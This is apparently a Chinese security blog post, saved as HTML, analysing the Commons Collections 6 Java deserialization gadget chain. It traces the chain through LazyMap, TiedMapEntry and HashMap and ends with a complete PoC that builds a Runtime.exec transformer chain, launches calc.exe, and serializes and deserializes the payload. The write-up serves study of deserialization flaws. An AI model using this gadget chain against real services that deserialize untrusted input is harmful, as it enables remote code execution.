@@ -1,0 +1,279 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>commons-collections6反序列化链 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="commons-collections6反序列化链 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="commons-collections6反序列化链分析
+整体分析
+cc6这条链我们先来ysoserial看看他的源码，源码如下
+我们可以看到，他也是使用了LazyMap，但是不同的是，他是通过其他方式调用到了LazyMap的get方法，我们..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              commons-collections6反序列化链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="commons-collections6反序列化链分析">commons-collections6反序列化链分析</h1>
+<h2 id="整体分析">整体分析</h2>
+<p>cc6这条链我们先来ysoserial看看他的源码，源码如下<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173321919.png" alt="image-20220411173321919" loading="lazy"></p>
+<p>我们可以看到，他也是使用了LazyMap，但是不同的是，他是通过其他方式调用到了LazyMap的get方法，我们可以深入来看看，这里由于前面学过cc1的LazyMap的那条链了，关注LazyMap前面的部分就不再赘述，如果有师傅不懂的可以看看前面的文章</p>
+<h2 id="细节分析">细节分析</h2>
+<p>咱就从 LazyMap的get方法开始吧，因为前面的和之前的链子是一样的。先找到谁调用了get方法，这里直接锁定TiedMapEntry的getValue方法，他这里返回了map.get(key),并且构造函数是publice，可以直接new TiedMapEntry这里的map对应的应该是之前的lazymap</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173327777.png" alt="image-20220411173327777" loading="lazy"></figure>
+<p>接下来是寻找调用getValue的位置，找到同个类下的hashCode方法</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173334640.png" alt="image-20220411173334640" loading="lazy"></figure>
+<p>这里调用了getValue()方法，我们得继续往上找，最好能直接找到在readObject方法中调用getValue()，ysoserial中给的是HashMap，那我们就在HashMap中找找</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173415252.png" alt="image-20220411173415252" loading="lazy"></figure>
+<p>在HaspMap的hash方法中能够找到调用hashCode方法，并且在readObject中找到了调用hash方法</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173421890.png" alt="image-20220411173421890" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173428825.png" alt="image-20220411173428825" loading="lazy"></figure>
+<p>至此这条链是差不多了，我们只需要手写poc即可，但是其实这里是有个小坑，就是在序列化的时候就会弹出计算器，这里的话和urldns那条链差不多的问题，我们这里会发现，在序列化的时候就触发了</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173434450.png" alt="image-20220411173434450" loading="lazy"></figure>
+<p>这里因为HashMap的put方法也调用了hash，所以我们要通过反射来修改tiedMapEntry的值，这里的话tiedMapEntry里面嵌套了lazyMap，lazyMap里嵌套了chainedTransformer，我们只需要改一层就好了，让他在put的时候的状态不能触发这条链，put完以后再改回去</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173440990.png" alt="image-20220411173440990" loading="lazy"></figure>
+<p>所以可以直接这样改</p>
+<pre><code class="language-java">        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();
+        Map&lt;Object,Object&gt; lazyMap= LazyMap.decorate(hashMap,chainedTransformer);
+//        Map&lt;Object,Object&gt; lazyMap= LazyMap.decorate(hashMap,new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;aaa&quot;);
+        HashMap hashMap1 = new HashMap();
+        hashMap1.put(tiedMapEntry,&quot;bbb&quot;);
+
+//        Class c=LazyMap.class;
+//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);
+//        factoryField.setAccessible(true);
+//        factoryField.set(lazyMap,chainedTransformer);
+</code></pre>
+<p>代码中被注释掉的都是修改以后的结果，大家可以先看看，但是改完以后会发现，反而没法触发了，这是怎么回事呢？这还是和urldns比较相似，我们只要把之前他put进去的一个键值对删了即可(哈哈这里其实我原本没调出来问题所在，想着先把文章发了，现在来补充印一下)。这里的话问题其实出在LazyMap的get方法中<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173449363.png" alt="image-20220411173449363" loading="lazy"></p>
+<p>我们直接在这个if这打上断点开始调试，我们可以看到，在这把这个key和value给put进去了，所以在反序列化的时候这里就有key了，就进不来了，我们只需要在后面把这个key给remove掉即可</p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173454976.png" alt="image-20220411173454976" loading="lazy"></figure>
+<p>所以只需要加上</p>
+<pre><code class="language-java">lazyMap.remove(&quot;ch1e&quot;);
+</code></pre>
+<p>再次调试，这次是反序列化以后的get了，因为把map里的ch1e的键删了，就可以进入if语句</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173519899.png" alt="image-20220411173519899" loading="lazy"></figure>
+<p>最终POC如下</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+public class cc6 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}),
+        };
+        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
+        HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();
+//        Map&lt;Object,Object&gt; lazyMap= LazyMap.decorate(hashMap,chainedTransformer);
+        Map&lt;Object,Object&gt; lazyMap= LazyMap.decorate(hashMap,new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;aaa&quot;);
+        HashMap&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;();
+        hashMap1.put(tiedMapEntry,&quot;bbb&quot;);
+        lazyMap.remove(&quot;aaa&quot;);
+
+        Class c=LazyMap.class;
+        Field factoryField = c.getDeclaredField(&quot;factory&quot;);
+        factoryField.setAccessible(true);
+        factoryField.set(lazyMap,chainedTransformer);
+        serialize(hashMap1);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+
+}
+</code></pre>
+<h2 id="疑惑点">疑惑点</h2>
+<p>这里的话，上面的poc里为了成功执行，使用了lazyMap.remove(&quot;aaa&quot;);但是其实我在想，我们的目的是调用LazyMap的get方法，里面进入if的条件是当前lazyMap对象的map属性中不能有key，那我们为什么要去使用lazyMap的remove，而不是使用map.remove呢，这里我尝试了一下，使用map.remove貌似也能执行？这先丢着，希望有会的师傅可以指导我一下</p>
+<p>这里解决了，还得是Y4哥哥猛啊</p>
+<p>大概意思就是，LazyMap是继承了AbstractMapDecorator类，在AbstractMapDecorator类中有写remove方法，但是在LazyMap中没有写，他是使用的父类的remove，父类的remove其实是返回map.remove，所以上面我说的为什么不去找map属性的而是找本身的remove，一切都可以解释了<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411173538306.png" alt="image-20220411173538306" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#commons-collections6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">commons-collections6反序列化链分析</a>
+<ul>
+<li><a href="#%E6%95%B4%E4%BD%93%E5%88%86%E6%9E%90">整体分析</a></li>
+<li><a href="#%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90">细节分析</a></li>
+<li><a href="#%E7%96%91%E6%83%91%E7%82%B9">疑惑点</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/commons-collections3-fan-xu-lie-hua-lian/">
+              <h3 class="post-title">
+                commons-collections3反序列化链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
